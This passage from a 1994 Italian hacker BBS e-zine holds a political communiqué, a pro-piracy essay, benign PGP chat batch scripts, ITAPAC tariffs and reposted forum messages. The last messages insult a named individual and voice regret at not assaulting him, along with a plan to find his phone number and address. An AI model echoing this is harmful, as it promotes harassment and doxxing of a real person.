una giunta che nulla hanno fatto per il recupero di intere
strutture e aree verdi di proprieta' del comune sotratte ad
un uso sociale e abbandonate al piu' completo degrado, in
attesa forse di tempi piu' propizi alla speculazione! Che
mentre chiude i centri sociali autogestiti e interamente
autofinanziati discute la "privatizzazione" di quelle poche
strutture territoriali esistenti (vedi centri giovani, centri
territoriali, ecc.) affidandole con cospicui finanziamenti
alla Compagnia delle Opere. Altro che occuparsi di giovani:
un vero e proprio scambio politico con interi settori del PPI
(leggi ex dc). Che spende miliardi per finanziare iniziative
culturali d'elite e impedisce lo svolgersi di manifestaazioni
popolari a bassi costo orgaizzate da "liberi cittadini". Che
usa la macchina amministrativa e burocratica come una
schiaccia sassi per azerare qualunque foerrma di dissenso
politico e sociale presente sul territorio. Che ...

Centro Sociale Leoncavallo


  Msg#: 7134                                         Date: 30 Aug 94  01:32
  From: ECN MILANO                                   Read: Yes    Replied: No 
    To: Tutti                                        Mark:                     
  Subj: x una manifestazione a milano il 10 settembre

PER UNA MANIFESTAZIONE NAZIONALE A MILANO IL 10 SETTEMBRE

A conclusione  di tre  giorni di  iniziativa  politica  e  di
dibattito tenutisi  presso il  C.s. Sergio Spazzali Hachmi di
Baggio il 19-20-21 agosto, le realta' presenti hanno definito
il seguente  comunicato, rivolto  principalmente a quanti, in
tutto il  paese hanno seguito le vicende dell'agosto milanese
e a  quanti nei  prossimi mesi  saranno chiamati per propria,
personale  o  collettiva  ,  situazione,  a  rispondere  alla
negazione di  diritti fondamentali sul piano delle condizioni
materiali  e   delle  liberta'  politiche  e  di  espressione
culturale.

Con  lo   sgombero  del   C.s.  Leoncavallo   e  il  parziale
smantellamento del  C.s. Spazzali  si sono chiariti ulteriori
elementi del  programma con  il quale  la destra  politica  e
sociale intende  governare il  paese. A  cominciare da quelle
zone dove  le elezioni  amministrative prima  e le  politiche
dopo hanno  consegnato un  identico segno politico tra potere
centrale e locale.
Abbiamo ribadito  , ancora  nel trascorso mese di luglio, che
un attacco all'esperienza dei centri sociali milanesi avrebbe
avuto il  significato di  una rottura  profonda con un intero
tessuto sociale;  in  una  situazione  in  cui  alle  movenze
generali, tutte  a danno  dei soggetti  subalterni, sui  temi
della casa,  del  reddito,  dell'istruzione,  della  generale
privatizzazione dei servizi... si e' velocemente assommata la
gestione della citta' operata dalla Lega Nord che ha visto la
progressiva compressione  delle opportunita'  di  espressione
politica e culturale.
Le  trasformazioni  produttive  degli  ultimi  decenni  hanno
evidenziato nuovi soggetti sociali portatori di forme proprie
di   organizzazione    politica   e    della   rappresentanza
autorganizzata nei  luoghi del  lavoro. L'attacco  ai  centri
sociali, l'esclusione  sistematica delle associazioni e delle
realta'  di   base  da   parte  della   macchina  burocratica
dell'amministrazione comunale piegata ai fini della battaglia
politica, il divieto reiterato imposto da mesi all'iniziativa
politica, fosse  essa corteo, presidio, festa, hanno pertanto
una gravita' particolare.
La bandiera  della lotta  all'illegalita' si e' avvitata e ha
sconfinato nel  diritto di esercizio delle liberta' politiche
e  sindacali,   affiancandosi  ad   un  uso   politico  della
magistratura che  ha  prodotto  nell'ultimo  anno,  sul  solo
territorio milanese,  oltre 800 denuncie, decine di processi,
svariate condanne  estese sempre  piu' ai  soggetti vari  con
motivazioni pretestuose. sempre piu' tese all'intimidazione.
Analoghi segnali  ci giungono  da piu' parti del paese, anche
se  in   un   quadro   di   differente   organicita',   volta
quest'ultima,  pensiamo,  alla  distruzione  delle  forme  di
visibilita'  e   organizzazione  che  questi  nuovi  soggetti
esprimono.
Tale processo  non puo'  eesere  stato  intrapreso  senza  la
precisa  intenzione  di  marginalizzare  questo  orizzonte  e
radicalizzarne le forme di lotta.
C'e' un'intera  generazione politica  che, ancora  una volta,
viene  posta   di   fronte   a   dinamiche   di   esclusione,
all'impossibilita' di  esprimere l'opposizione nelle infinite
emergenze di  cui e strumentalmente piena la storia di questo
paese.
Una   generazione    che   dovra'    assumersi   dunque    la
responsabilita' di un rapporto con "l'illegalita' " crescente
dei  propri  comportamenti  ,  e  dall'altro  il  compito  di
reinventare gli  spazi e  le forme  della propria  agibilita'
politica sul territorio.
Abbiamo inoltre rilevato in questi mesi il definitivo decesso
dell'opposizione della sinistra istituzionale nella citta' di
Milano, come parte di un piu' generale quadro nazionale.
Una presenza questa in balia dei forti poteri che ridisegnano
il  territorio,  che  costringono  il  lavoro  vivo  presente
saccheggiando quello  passato, limando  i redditi  reali e le
pensioni, che liquidano il diritto alla casa come quello alla
salute, che  occupano i  centri  del  potere  come  fonte  di
interesse privato....
Non possiamo  dunque maggiormente  indugiare dal  mettere  in
campo un  impegno che  assuma la forma, nei mesi a venire, di
una   mobilitazione   generale   della   variegata   presenza
autogestionaria, autorganizzata, anticapitalista.
Gia' nei mesi passati quest'area politico sociale ha avuto la
forza di  formulare, nel  complesso, una  rinnovata capacita'
progettuale alla  ricerca di  un tessuto possibile tra i fili
delle sue  molte componenti. Una duttile allenza, dicemmo, in
grado di  rispondere alla  necessita' di opposizione radicale
che questa fase politica ci consegna.
Ci  sembra   di  poter   proporre,  sul  complesso  dei  temi
evidenziati in  questo breve  comunicato, un corteo nazionale
he apra,  a Milano,  la stagione  delle lotte  sociali, il 10
settembre.
Una iniziativa  all'interno di  tre giornate  di dibattito  e
spettacolo (nelle date del 9/10/11 settembre) sul quale grava
gia' l'ombra di un ennesimo divieto, a ribadire ulteriormente
il dato  di una  citta' sottoposta da molti mesi ad un regime
speciale per l'ordine pubblico.
Il governo  militare della  citta', percorsa  e presidiata da
altrettanti mesi dalle truppe del Ministero degli Interni, e'
la testimonianza  palpabile della  fragilita' del  suuo corpo
politico dirigente e della sua amministrazione.

CHI GOVERNA  CHI?  E'  la  sfida  che  abbiamo  aperto  nella
discussione di  questa settimana,  accingendoci a predisporre
gli strumenti affinche' tale domanda non rimanga tale.
Per intanto  invitiamo tutti  coloro cui  questo  appello  e'
rivolto a  mobilitarsi affinche'  venga affermato  il diritto
della liberta'  di organizzazione  ed  espressione  politica,
quanto quello  all'autogestione, nella  citta' di Milano e in
generale nel paese.
A qualunque  prevedibile divieto,  di fronte all'esercizio di
un diritto  quale quello  di manifestare un'opposizione reale
che   va    dall'aurtorganizzazione   all'autogestione   fino
all'associazionismo   e    alle   molteplici    forme   della
rappresentanza e della democrazia diretta, sapremo rispondere
in modo  adeguato  e  di  massa,  il  divieto  e'  quindi  da
considerarsi un  vero e proprio attacco nei confronti di chi,
facendo  uso  della  ragione,  ridetermina  l'opposizione  in
questo paese attraverso rapporti di forza stabili.

L'APPUNTAMENTO   PER   TUTTI   I   COMPAGNI/E   E'   PER   LA
MANIFESTAZIONE DEL 10 SETTEMBRE A MILANO E PER UNA TRE GIORNI
DI MUSICA MA ANCHE DI DIBATTITO IN LUOGO ANCORA DA STABILIRE.
PER I  COMPAGNI/E CHE  VOGLIONO VENIRE A MILANO FATE ARRIVARE
UN FAX ALLO 0339226820360.

Milano, 28 Agosto
Le  realta'   promotrici  della  tre  giorni  antifascista  e
antirazzista del  19-20-21 Agosto  e della manifestazione del
10 Settembre.

-----------------------------FINE MESSAGGI---------------------------------

     Questi sono i messaggi che ho trovato ... che ne pensate ? Io ritengo che 
la situazione sia semplicemente TERRIFICANTE ! Se volete dire la vostra  scri-
vete  pure alla ns redazione, IN PGP, agli indirizzi di posta elettronica  che 
troverete in fondo alla rivista. E ricordatevi che cerchiamo sempre collabora-
tori !!!

					     Dupree's Paradise


-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 12

		   ---------------------------------------
		       CHI TUTELA DANNEGGIA ANCHE TE !
				       
				      di
				       
				    M B F
		     -----------------------------------

[N.d.R. Abbiamo trovato questo messaggio nelle aree CYBERNET. E' semplicemente 
FANTASTICO, sarebbe da fargli un MONUMENTO. Leggetelo, e se avete commenti  in 
proposito, scriveteci pure.]

Con l'augurio che il testo di questo msg finisca nelle mani di qualche respon-
sabile della BSA, ed in riferimento all'apertra dello speciale "Italian  crac-
kdown"  (Decoder 9), esprimo il mio parere sulla strategia di tutela  software 
intapresa dalla suddetta associazione. 

Smentiamo l'"originale" slogan "Chi copia danneggia anche te !".

La  pirateria software puo' danneggiare rivenditore, produttore e  autore  del 
programma, ma e' priva di fondamento la dichiarazione che il fenomeno  finisca 
col  danneggiare l'utente. La duplicazione del software, sorta di  concorrente 
invisibile al dominio delle software houses, ha sempre, ed e' storia, stimola-
to in modo positivo il mercato: se il produttore non avesse avuto questa sorta 
di  nemico fantasma contro cui combattere, giammai avrebbe offerto  all'utente 
gadgets, assistenza post-vendita, consulenze, pacchetti a condizioni speciali.

Le incriminate reti telematiche amatoriali sono oggi, pur considerato l'  ine-
vitabile rischio di copie abusive, il piu' grande, rapido e capillare supporto 
al beta-testing, allo shareware e ad altre strategie di collaudo e vendita che 
nessuna software house si sarebbe potuta singolarmente permettere: una  colos-
sale rete di presentazione, discussione e distribuzione demo del prodotto  che 
inevitabilmente spinge diversi utenti all' acquisto dell'originale.

In  ogni forma ed in ogni caso, dalla diffusione amatoriale del software  l'u-
tente  ha sempre tratto vantaggi ed i produttori, che oggi tra i miliardi  in-
cassati  piangono miseria, anche. Si sono fatti conoscere senza  spendere  una 
lira in pubblicita' e questo porta inevitabilmente a contatto gli utenti con i 
prodotti originali.

L'esperienza italiana ha dimostrato, dalla benzina alle assicurazioni, che  le 
associazioni di categoria, ottenuto il controllo totale del mercato, se ne so-
no sempre fottute dell'utente e, ben lungi dallo scendere in reale concorrenza 
tra  loro, i singoli produttori si sono trovati immediatamente  concordi  nel-
l'aumentare i prezzi e diminuire la qualita' dei servizi.

I produttori di software, che non fanno eccezione, non aspettano altro che  la 
legge sulla tutela li lasci padroni del campo in modo da poter imporre prodot-
ti  scadenti a prezzi maggiorati, ben sapendo che l'utente sara' costretto  ad 
accettare  per mancanza di alternative: i segnali premonitori in questa  dire-
zione (tipicamente riservati al nostro Paese) non mancano.

Se qualcuno di voi ama testare il software, smentira' con facilita' il secondo 
dogma su cui poggia l'attuale concetto di tutela del medesimo: la leggenda se-
condo  la quale il programmatore si farebbe un culo grande come una  portaerei 
per realizzare il prodotto. Ebbene, i programmi "leggeri" (i videogiochi,  per 
intenderci)  comportano spesso e volentieri una difficolta' di realizzo  abis-
salmente superiore al gestionale da prezzo milionario tanto decantato. 

Il realizzatore di businnes software si appoggia al sistema operativo che gen-
tilmente  gli  processa tutte le funzioni di interfaccia utente  senza  fargli 
spendere  due righe di codice, o in alternativa all'incredibile numero di  li-
brerie che un linguaggio ad alto livello possiede; e' inoltre piuttolto  radi-
cata l'abitudine di far proliferare il software commerciabile passando al col-
legatore gli stessi moduli oggetto, differentemente ordinati, con le modifiche 
necessarie e sufficienti a non far capire al cliente che nascoste in due o tre 
etichette distinte ci sono in realta' le stesse routines. La disposizione del-
le icone in utilities del tutto diverse, e' straordinariamente simile; in que-
sto modo il programmatore evita di ricalcolarsi ascissa ed ordinata di rileva-
zione  evento in piattaforma grafica ed incassa n volte i diritti vendendo  lo 
stesso modulo allo stesso utente.

Piu' che i realizzatori di piattaforme, peraltro contenti delle royalities mi-
liardarie che ogni giorno piovono sul loro capo, sono questi programmatori  di 
secondo  livello a premere oggi per la tutela del loro "ingegno" chiedendo  i-
noltre la brevettazione dell'algoritmo come supplementare metodo per realizza-
re denaro (come se gli eredi di Piatgora chiedessero una somma a chiunque  vo-
lesse calcolare l'ipotenusa dati i cateti).

Altre simpatica pratica introdotte dagli sviluppatori di software e'  l'espan-
sione artificiale di un file (che viene gonfiato allocando aree di memoria  i-
nutili o del tutto superflue) in modo da impressionare l'utente con il  numero 
di dischetti che costituisce l'applicativo e giustificare il costo.

Indimostrabile ma credibile, infine, il contributo nascosto dato (in cambio di 
altri  favori)  dai mercanti del software a quelli dell'hardware  mediante  la 
scelta  di architetture sw, tutt'altro che indispensabili  ed  insostituibili, 
che obbligano l'utente a costose modifiche dell'hardware.

Ora sapete cosa vuole proteggere la BSA. Essendo lo Stato il suo cliente idea-
le (i ministeri italiani comprano qualunque porcata di prodotto tanto paga  il 
contribuente), e prendendo atto del fatto che tale associazione non si e'  mai 
premurata di mettere in discussione gli elevatissimi profitti concedendo  agli 
enti pubblici software a condizioni agevolate (le proposte fatte sono, in ter-
mini di mercato reale, una vergogna), riesaminate lo slogan e chiedetevi se di 
fatto  il contribuente non sia piu' danneggiato da questa forma di tutela  che 
prevede  che l'utente paghi e taccia. I costi dell'adeguamento alla  normativa 
di tutti gli enti pubblici italiani, multe comprese, li paghiamo noi tutti. 

Lo  Stato legifera e il cittadino scuce. 

Ma  chi tutela l'utente dai bugs del programmatore, dai crash di  sistema  per 
errata previsione dello stack, dai mostruosi errori di traduzione, dai collau-
di non fatti, dalle documentazioni approssimative, dalle duplicazioni sbaglia-
te dell'importatore ????

Al  massimo vi ridanno una copia del software o vi fanno lo sconto  (!)  sulla 
release successiva... mentre una software house che va a rompere i coglioni in 
una  scuola elementare perche' uno (UNO !) dei files installati non  e'  regi-
strato e poi rilascia un eseguibile con bug, dovrebbe sputare sangue per paga-
re un fiume di danni, essere rovinata per sempre. 

Perche' alla software house e' stato concesso il diritto di chiedere centinaia 
di biglietti da mille per una manciata di righe di compilato mentre se il  mio 
fornaio chiede 50mila per una pagnotta arrivano (giustamente) i Carabinieri ??

Qualcuno  ha la coda di paglia, teme che l'utente abbia il materiale per  fare 
dei  confronti e per scoprire le sporche manovre dei signori  del  software... 
allora si chiudano le reti, si proibisca la duplicazione a tutti i livelli, si 
promuova una campagna delatoria nazista del tipo "denunciate il vicino di casa 
che  copia!" (non e' uno scherzo, purtroppo! Ci sono i  tagliandi  prestampati 
per la denuncia su giornali e riviste) cosi' finalmente anche i prodotti  sca-
denti troveranno spazio, l'utente sara' fottuto ancora una volta e gli  adepti 
della BSA continueranno a sguazzare nel denaro ridendo alla faccia nostra!


					      M F B


[N.d.R. Sono commosso ! Sigh ! ;'( ]

-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 13


[N.d.r. Questo file e' in INGLESE. Rompetevi le corna. *;) ]

From: jabowery@netcom.com (Jim Bowery)
Subject: PGPCHAT Release 1.0
Date: Mon, 6 Jun 1994 19:45:05 GMT


			 PGP WIN-DOS CHAT
			     --- ---
			   Release 1.0

		       A MODEM-CHAT FACILITY

		      WITH PRETTY GOOD PRIVACY

				by

			    Jim Bowery


PGP Win-DOS Chat is a sloppy little facility which allows people
to conduct a rather slow 2-way PGP-encrypted chat via modems.

It requires Telix (the comm program), so if you don't have Telix,
get a copy and make sure you have the "cs.exe" Telix script compiler
with it.

It requires PGP.
You should be familiar with encrypting and decrypting messages with
PGP before you attempt to run this facility.  It uses default key
rings and for decryption it uses your default private key.

This has only been tested under Windows NT so if it doesn't work
under a non-preemptive Windows like 3.1, that's probably why.


INSTALLATION

I)

You should probably make sure your PGP "config.txt" file contains
a line that says:

VERBOSE = 0

This is to keep the PGP "noise" messages from interfering with
your chat.


II)

There are 3 script files included below.  Follow the directions
for the installation of each of them.


FILE: sendpgp.bat

The following batch file should be placed in your PGP directory
with the name sendpgp.bat.

------------------------- CUT HERE -------------------------
echo off
rem Run this with one argument -- PGP userid of person you are sending to.
rem Be sure to set PGPPASS in environment.
:abc
echo Enter PGP chat message (end with CTRL-Z):
copy con sendpgp.txt
:def
if exist sendpgp.asc goto def
pgp -esa sendpgp.txt %1
del sendpgp.txt
goto abc
------------------------- CUT HERE -------------------------

FILE: recvpgp.bat

The following batch file should be placed in your PGP directory
with the name recvpgp.bat.
------------------------- CUT HERE -------------------------
echo off
rem Receives PGP chat messages.  Be sure to set PGPPASS in environment.
:abc
if not exist recvpgp.pgp goto abc
pgp recvpgp.pgp -o recvpgp.txt
type recvpgp.txt
del recvpgp.txt
del recvpgp.pgp
goto abc
------------------------- CUT HERE -------------------------

FILE: pgpchat.slt

The following Telix script should be placed in your Telix directory
with the name pgpchat.slt.  If your PGP directory is somewhere
other than "\pgp\" relative to your Telix directory, you will
have to edit "pgpchat.slt" and change all references to the
"\pgp\" path to the path of your PGP directory relative to your
Telix directory.

Then you should execute the command:

C:\telix>cs pgpchat.slt

This will generate a file named "pgpchat.slc" which is your Telix
script executable.
------------------------- CUT HERE -------------------------
main()

{
 int t1;
 str buf[80];

 t1=track("-----END PGP MESSAGE-----",0);
 capture("\pgp\recvpgp.asc");

 while (1)
  {
   terminal();
   if(track_hit(0) == t1){
    capture("*CLOSE*");
    frename("\pgp\recvpgp.asc","\pgp\recvpgp.pgp");
    capture("\pgp\recvpgp.asc");
   }
   if(filefind("\pgp\sendpgp.asc",0,buf)){
     frename("\pgp\sendpgp.asc","\pgp\sendasc.txt");
     type_file("\pgp\sendasc.txt");
     fdelete("\pgp\sendasc.txt");
   }
   delay(10);
  }
}

type_file(str fname)

{
 int f;
 str buf[100];
 int ichar, lines_sent = 0;

 f = fopen(fname, "r");
 if (!f)
  return -1;

 host_send("^M^J");

 while (1)
  {

   if (fgets(buf, 80, f) == -1)
    {
     fclose(f);
     return 1;
    }

   host_send(buf);
   host_send("^M^J");
   terminal();
  }
}

//////////////////////////////////////////////////////////////////////////////

host_send(str outstr)

{

 cputs(outstr);

}

//////////////////////////////////////////////////////////////////////////////

------------------------- CUT HERE -------------------------



STARTING UP PGP WIN-DOS CHAT



1)

>From the Windows Program Manager, bring up three DOS Prompt windows.


2)

In one window, enter the PGP directory and execute:

C:\pgp>SET PGPPASS=<your pgp pass phrase>
C:\pgp>recvpgp


3)

In another window, enter the PGP directory and execute:

C:\pgp>SET PGPPASS=<your pgp pass phrase>
C:\pgp>sendpgp <userid>

Where <userid> is the PGP userid you would use to encrypt a message
to the person you will be chatting with.


4)
In the third and last window, enter the Telix directory and execute:

C:\telix>telix


5)

To test out your end of the chat system without bothering your friends,
make sure your modem is echoing your commands by typing:

ATZ<cr>

It should echo the "ATZ" on your terminal screen and respond with "OK".


6)

Press ALT-G in Telix and enter "pgpchat" at the prompt to activate
the Telix script.


7)

Activate the "sendpgp.bat" window.

You should see the prompt:

"Enter PGP chat message (end with CTRL-Z):"


8)

Do what the prompt says.

It should then begin encrypting what you typed and return you
to the prompt.

You should then see the Telix window scroll (painfully slowly)
a PGP encryption block.

Sometime later, the "recvpgp.bat" window should display the
same message you entered in the "sendpgp.bat" window.

If so, your end of the system is working.

CAVEAT:  You WILL see errors crop up in about 1 in 5 test messages
that you try to send.  This is due to the fact that the "self-test"
is using the modem's character echo to simulate the presence of
another user and the modem will, from time to time, see an
"AT" command in the middle of a PGP encyption block.  When this
happens, you should see a modem response in the middle of the
PGP encryption block on the Telix screen and PGP error messages
later cropping up on the "recvpgp" screen.  Ignore these errors.

9)

Go to the Telix window and press ALT-X to quit Telix.


10)

Reenter Telix, but this time, hold off on executing the
"pgpchat" script.


11)

Dial your friend's modem and make sure you are connected.


12)

Once the modem connection is established with your friend, press
ALT-G in Telix and enter "pgpchat" at the prompt to activate the
Telix script.


13)

Activate the "sendpgp.bat" window and start typing.

You should see your friend's messages pop up in the "recvpgp.bat"
window.

When you are ready to quit, just kill all three DOS windows.


TIPS ON USAGE


I)

Don't send more than about a message per 30 seconds.  If you send
faster than that, the PGP data stream might get backed up.  The
flow control is there but it is minimal.


II)

You can send text files by the following procedure:

1) Go into Windows' Notepad program and open the file you want to send.
2) Press SHIFT-CONTROL-END to select the entire file.
3) Press CONTROL-INS to copy the file to your clipboard.
4) Reactivate the "sendpgp.bat" window.
5) Press SHIFT-SPACE.
6) Press "e".
7) Press "p".
8) Press CONTROL-Z

This should cause the entire text file to be typed into your
"sendpgp.bat" window, encrypted and sent to your friend.


III)

Your and your friend may have a bit of trouble reading more than
25 lines of text at a time since the "recvpgp.bat" window just
scrolls off the top (its just a DOS window after all).  You might
want to run that DOS window under one of the "scroll buffer"
programs that lets you scroll back and see what has scrolled
off the DOS prompt window.

-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 14


			  --------------------------
			  LE NUOVE TARIFFE DI ITAKAZ 
			  --------------------------



     Sembrano  convenienti,  ma non ancora. Date un'okkiata ... se  usata  con 
parsimonia, una buona NUI affittata potrebbe anche essere "fattibile". 


					    Aggiornato al 31.2.94

X.28 COMMUTATO
==============
Tariffe di Accesso
==================

Canone di abbonamento 
menisile                                              L. 12.500
  ^^^

Modem Multistandard                                   (vedi
						  listino modem)

Traffico Nazionale

-   Tariffa telefonica per il collegamento alla centrale ITAPAC
-   per ogni chiamata                                 L. 20
-   occupazione porta (per ogni minuto)               L. 20

    Collegamento su ITAPAC:
-   per ogni minuto                                   L. 5,5
-   per ogni segmento                  fino a 200.000 seg./mese
						      L. 1,2
				       oltre 200.000 seg./mese
						      L. 0,7
Riduzioni sul traffico
----------------------
Dalle ore 22 alle ore 7 di ogni giorno, il sabato e i giorni festivi si
applicano le seguenti tariffe ridotte:

-   per ogni minuto                                   L. 2
-   per ogni segmento                  fino a 200.000 seg./mese
						      L. 0,36
				       oltre 200.000 seg./mese
						      L. 0,21

Prestazioni opzionali
---------------------

Gruppo Chiuso d'Utente (CUG)
    utente responsabile                          L. 56.000/mese
    utente di CUG                                L. 1.000/mese
Documentazione Addebiti                          L. 35
				       per ogni chiamata virtuale
				       documentata
Modifica NUI (password),
opzioni, parametri                               L. 50.000


					    Aggiornato al 1.4.93

TRAFFICO INTERNAZIONALE
=======================
Le tariffe di seguito descritte valgono per ogni tipo di accesso.

Europa e Bacino                        Paesi Extraeuropei
del Mediterraneo

Tariffa a tempo                        Tariffa a tempo
---------------                        ---------------
fino a 200 ore/mese                    fino a 200 ore/mese
L. 86,4/min. o fraz.                   L. 198,018/min. o fraz.

oltre 200 ore/mese                     oltre 200 ore/mese
L. 60,48/min. o fraz.                  L. 138,618/min. o fraz.


Traiffa a volume                       Tariffa a volume
----------------                       ----------------
^^^  
fino a 200.000 seg./mese               fino a 200.000 seg./mese
L. 51,84 / 10 seg. o fraz              L. 118,8 / 10 seg. o fraz.

oltre 200.000 seg./mese                oltre 200.000 seg./mese
L. 36,288 / 10 seg. o fraz.            L. 83,16 / 10 seg. o fraz



     Abbiamo anche evidenziato un po' di errori di stampa. 
Fonte  dell'Informazione : 
	  Info Itakaz, NUA 26100298 (Id Itapac Itapac al login)

-----------------------------------------------------------------
The Black Page - Numero 0, Settembre 1994 - Articolo 15

AT
OK
ATD

CONNECT 28.800/VAF/FAN/CULO

		    E adesso sorbitevi anche queste
 =========================================================================
   SSSSSS TTTTTTT RRRRR   OOOO  N     N ZZZZZZ  AAAA  TTTTTTT EEEEEE   !!
  S          T    R    R O    O NN    N     Z  A    A    T    E        !!
  S          T    R    R O    O N N   N    Z   A    A    T    E        !!
   SSSSS     T    RRRRR  O    O N  N  N   Z    AAAAAA    T    EEEEE    !!
	S    T    R    R O    O N   N N  Z     A    A    T    E        !!
	S    T    R    R O    O N    NN Z      A    A    T    E      
  SSSSSS     T    R    R  OOOO  N     N ZZZZZZ A    A    T    EEEEEE   !! 
 =========================================================================
 ________________________________________________________________
 A grande richiesta ecco la famosa "mucca che caga" di Sxs!!!!!!!
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

	    (__)    <---- queste sono un paio di corna...
	    /oo\\________
	    \\  /        \\
	     \\/      /   \\  <---- questa e' la mucca....
	      \\_|___\\_|/.\\
		||   YY| o '
		||    || O   <---- e questa e' la cacca.....
		^^    ^^

     Beh,  con  il tacito permesso di Sxs che ha postato tempo fa  questa  sua 
creazione su Ultimo Impero BBS (Si, proprio loro, quei FOTTUTI COGLIONI  della 
Redazione di TGM che SPUTTANANO i file .MOD inserendo il loro BANNER DEL CAZZO 
rovinando  l'intestazione  dei  moduli e spesso cancellando i  nomi  dei  veri 
autori dei suddetti, per mettere invece il nome ed il numero della loro MERDO-
SA BBS DEL CAZZO, che fa cagare mezzo mondo, col suo incasinatissimo CNET  che 
nessuno ci capisce mai un CAZZO e infatti NON LO USA NESSUNO ...), dicevo, col 
permesso  di Sxs useremo questa sua meravigliosa creazione come  Banner  della 
nostra rubrichina. 

     Che non e' necessariamente una rubrica di stronzate, ma un insieme di co-
se  prese qua' e la' in vari posti, pervenuteci ai ns indirizzi EMAIL o  lette 
nei giornali ecc. ecc.

     Sta  a voi distinguere le EMERITE STRONZATE dalle INFO ELITE dai MSG  Di-
vertenti a quel che cazzo volete. Fate un po' voi !!!

     Sxs  : Se sei contrario a cio' di cui sopra, hai l'indirizzo Email a  cui 
scrivere ! ;)

     Alcuni dei messaggi sono stati "censurati" dalla redazione per evitare
problemi. Se siete contrari a cio', o favorevoli, scriveteci e fateci sapere
cosa ne pensate.

     Bene, si comincia !!!!
     ----------------------


----------------------------------------------------------------------------
Messaggeria Black Jack

(compianta NUA 21124062 :( ora solo da VDT ma non so la pagina)

Area : Sysop  
MSG N. 2230  Del: 02-06-94 21:03:02    
Di: PhalanX

 in nome di una ristretta cerchia di persone che irridono al clericalismo 
e che aborriscono chiunque tenti di giustificare l'essenza delle cose in 
base a preconcetti mistici, io chiedo formalmente l'apertura di un'area 
destinata allo scambio di invettive contro la simbologia (e si badi: solo 
essa, e NON i concetti) clericale e religiosa in genere. Mi candido alla 
moderazione, ben conscio delle capacita' di moltri altri utenti in materia.

---------------------------------------

Msgr. Arkimede
Area GENERALE              
Mitt  JOE                  
Data 28/08/94 02:17:18     
Msg#1495 1/1   Object: ore 2.15
		       
Un'altra partenza.                      
L'estate volge al termine               
minuto dopo minuto.                     
E' forse come svegliarsi da un sogno.   
					
Viva la Guinness.                       
Le ore piccole e le grandi donne.       
Viva me.                                
					
Joe                                     
					
p.s.: chissa' qual'e' la verita'.       

---------------------------------------
Decoder BBS

  Area: Dibattito CyberPunx 
  Msg#: 6647                                         Date: 20 Aug 94  17:33
  From: Ice Man                                      Read: Yes    Replied: Yes
    To: All                                          Mark:                     
  Subj: Ai mie tempi c'era la guerra!

... E voi  pensevate ke fosse finita???
  da "LA STAMPA" di Sabato 20 Agosto..

  Le indagini telematike di uno studente ingaggiato dai giudici di milano
          
          U N   D E T E C T I V E    D E L    C Y B E R S P A Z I O 

                Cosi' ho katturato i pirati informatici

-> Riporto solo i pezzi piu interessanti...

  ...Cotrozzi Massimo la vita la passa per meta' a Milano e per meta' nel
     suo computer. 12 ore in un posto 12 ore in un altro.
     Lo ingaggiano le socita' commerciali per proteggere dalle intrusioni
     le loro banke dati, lo ingaggiano i giudiciper skoprire i kolpevoli dei 
     reati di pirateria informatika.

-> Ok  kazzo kuesto mi sempra gia di averlo letto ... solo ke era su un libro 
   di sterling!!! ma il meglio deve ankora venire!!!

  ...Massimo Cotrozzi laureato in informatica nove annni poassati a viaggiare
     tra terra e cyberspazio a skoprire i segreti della informatica, a capire
     come si violano le difese telematike e kome si possono renderle meno
     vulnerabili, a interpretare la filosofia degli hacker e kuella dei 
     crekers.

-> In pratika sto stronzo si e' fatto una 15ina di sistemi ha preso le sue nui
   si sara' fatto passae le frekuenze per boxare e un giorno si e' svegliato e 
   ha detto... Kazzo mi annoi di nuovo!!!!
   Ke faccio?? bhe adesso passo dalla parte opposta!!!!!

   Te lo diko kon tutto il kuore e spero ke sto messaggio tu lo legga karo il 
   mio Cotrozzi

                   
                           S  T  R  O  N  Z  O  !


   E pregerei tutti a unirsi al mio koro!!!!
   Ma riprendiamo l' artikolo!!

   "...Io passo molte ore sulle Chat-Line degli hackers. 
    Ieri sera parlavo con uno ke era al komputer da 36 ore di file ed era gia'
    entrato in 12 sistemi.
    Seguo unsando uno pseudonimo e collegandomi da un telefono diverso da 
    kuello registrato le loro konversazioni.

-> Dunke appurato ke sto kui' e' stronzo dalla testa ai piedi prosegiuamo...
   Chat-line pirata???????? seee mo han fatto la 

     144-xxx-xxx   _Hacker in linea.
   Bho si sapessa al meno spiegare...
   E non ho klapito perke' usa un altro telefono ke ha paura ke sulle bbs lo 
   traccino?

   Komunku l'artikolo kontinua ma direi ke ho reso l' idea!!!!! ultima kikka 
   per finire...

   "...Sono (relativo agli hackers NdS) infiltrati dovunkue e io sono
   infiltrato tra di loro..."

-> Ekko kon sta frase delle balle da film di 4o ordine finisko il mex.

   Il bello e ke sto stronzo ne va' pure fiero di kuello ke ha fatto!!!!!!
   
   Il giudizio hai posteri ma intano la nomina di 

                            STRONZO DEL MILLENIO 
   mi pare abbia trovato il suo vincitore!!!!

... -**- TURN ON YOUR BRAIN <=--------=> FREE YOUR MIND -**-
-!- Blue Wave/RA v2.12 [NR]
 ! Origin: ---> ECN_TO +39-11-6507540 <--- (45:1917/2.0)
SEEN-BY: 1/1 5/1 9/1 10/2 30/1 1000/1 4 1100/1 1200/1 2 5 6 7 1400/1 1500/1
SEEN-BY: 1600/1 1800/1 1900/1 1917/1 2 3 11 2000/1

[ N.d.r. STROOOOOOONZOOOOOOOOOOOO!!!!!!!!!!!!]
==============================================

  Msg#: 7468                                         Date: 02 Sep 94  00:56
  From: MainMan                                      Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: News sulla merdaccia... ops, Cotrozzi...

From: mainman@cubalibre.crn.gaia.it (MainMan)

Ciao a tutti!!!

Ho novita` sul faccia di merda... che e` una vecchia conoscenza al Poli a
Milano... e` noto per essere una testa di cazzo, anche grande, oltre che un
idiota colossale... A quanto pare e` totalmente un infame, in quanto ex-hacker
egli stesso, anche se piuttosto LAMA...

Ma il bello deve ancora venire... Forse ricorderete quando il Leonka doveva
andare in via Adriano, che dei gruppetti di teste di cazzo protestavano
animatamente... uno di loro era rimasto lievemente ferito... ecco, era proprio
il "nostro"... peccato non averlo steso quando ce n'era la possibilita`...

Comunque vedo di riuscire ad avere almeno un numero di telefono, se non
addirittura l'indirizzo... ;-)

-- 
    c u l8r
      by
     Brian
